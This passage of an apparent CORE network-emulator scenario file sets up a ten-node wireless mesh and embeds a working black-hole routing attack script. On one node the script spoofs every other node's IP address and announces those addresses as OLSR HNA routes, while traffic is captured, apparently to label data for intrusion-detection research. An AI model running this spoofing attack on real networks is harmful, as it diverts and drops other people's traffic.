	nrlolsrd -i eth0 -hna $logPath/tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
				echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > $logPath/attack.txt

		if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > $logPath/attack.txt




EOF
) > attack.sh

chmod 755 attack.sh

./attack.sh 60 60 7 10 /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt 
else
	echo `hostname` >> /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt/check.txt
	mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn | /root/install/sedap/IntelAttacker/mgenCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt > `hostname`.mgencapture &
fi
    }
    services {OSPFv3MDR zebra vtysh  IPForward}
    
}

node n10 {
    type router
    model router
    network-config {
	hostname n10
	!
	interface eth0
	 ip address 10.0.0.10/32
	 ipv6 address a:0::10/128
	!
    }
    iconcoords {108.0 389.0
}
    labelcoords {196.387421 486.134022}
    canvas c1
    interface-peer {eth0 n11}

    custom-post-config-commands {
route add default dev eth0
route add -net 224.0.0.0 netmask 224.0.0.0 dev eth0
    
#!/bin/sh
HN=`hostname`
if [ `uname` = "FreeBSD" ]; then
  SCRIPTDIR=/tmp/e0_$HN
else SCRIPTDIR=/root/
fi
cd $SCRIPTDIR
mkdir 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
cd 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
    
#get ip of current
hostnameLen=`expr length $HN`
hostnameLen=`expr $hostnameLen - 1`
myIP="10.0.0.`expr substr $HN 2 $hostnameLen`"

#now insert attack script
if [ `hostname` = n7 -o 7 = 0 ]
then

#start logging
tshark -a duration:175 -nli eth0 -T fields -E separator=, -e frame.time_epoch -e frame.len -e frame.protocols -e ip.src -e ip.dst -e ipv6.src -e ipv6.dst -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport | /root/install/sedap/IntelAttacker/netCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt $myIP > $HN.capture &    

mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn output /dev/null &

(
cat << 'EOF'
#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
	nrlolsrd -i eth0 -hna $logPath/tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
				echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > $logPath/attack.txt

		if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > $logPath/attack.txt




EOF
) > attack.sh

chmod 755 attack.sh

./attack.sh 60 60 7 10 /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt 
else
	echo `hostname` >> /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt/check.txt
	mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn | /root/install/sedap/IntelAttacker/mgenCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt > `hostname`.mgencapture &
fi
    }
    services {OSPFv3MDR zebra vtysh  IPForward}
    
}

node n11 {
    type wlan
    network-config {
	hostname wlan11
	!
	interface wireless
	 ip address 10.0.1.0/24
	 ipv6 address a:1::0/64
	!
	scriptfile
	/root/install/sedap/IntelAttacker/staticScenarios/treeCoords.scen
	!
	mobmodel
	coreapi
	basic_range
	ns2script
	!
    }
    iconcoords {0 0}
    labelcoords {0 0}
    canvas c1
    interface-peer {e0 n1}
    interface-peer {e1 n2}
    interface-peer {e2 n3}
    interface-peer {e3 n4}
    interface-peer {e4 n5}
    interface-peer {e5 n6}
    interface-peer {e6 n7}
    interface-peer {e7 n8}
    interface-peer {e8 n9}
    interface-peer {e9 n10}
	custom-config {
	custom-config-id basic_range
	custom-command {3 3 9 9 9}
	config {
	range=176
	bandwidth=54000000
	jitter=0
	delay=50000
	error=0
	}
    }
    custom-config {
	custom-config-id ns2script
	custom-command {10 3 11 10 10 10 10 10}
	config {
	file=/root/install/sedap/IntelAttacker/staticScenarios/treeCoords.scen
	refresh_ms=50
	loop=0
	autostart=1.0
	map=
	script_start=
	script_pause=
	script_stop=
	}
    }
}

link l1 {
    nodes {n11 n1}
    bandwidth 54000000
    delay 50000
}

link l2 {
    nodes {n11 n2}
    bandwidth 54000000
    delay 50000
}

link l3 {
    nodes {n11 n3}
    bandwidth 54000000
    delay 50000
}

link l4 {
    nodes {n11 n4}
    bandwidth 54000000
    delay 50000
}

link l5 {
    nodes {n11 n5}
    bandwidth 54000000
    delay 50000
}

link l6 {
    nodes {n11 n6}
    bandwidth 54000000
    delay 50000
}

link l7 {
    nodes {n11 n7}
    bandwidth 54000000
    delay 50000
}

link l8 {
    nodes {n11 n8}
    bandwidth 54000000
    delay 50000
}

link l9 {
    nodes {n11 n9}
    bandwidth 54000000
    delay 50000
}

link l10 {
    nodes {n11 n10}
    bandwidth 54000000
    delay 50000
}

canvas c1 {
    name {Canvas1}
    wallpaper-style {upperleft}
    wallpaper {sample4-bg.jpg}
    size {1000 750}
}


option global {
    interface_names no
    ip_addresses yes
    ipv6_addresses yes
    node_labels yes
    link_labels yes
    ipsec_configs yes
    remote_exec no
    exec_errors yes
    show_api no
    background_images no
    annotations yes
    grid no
}

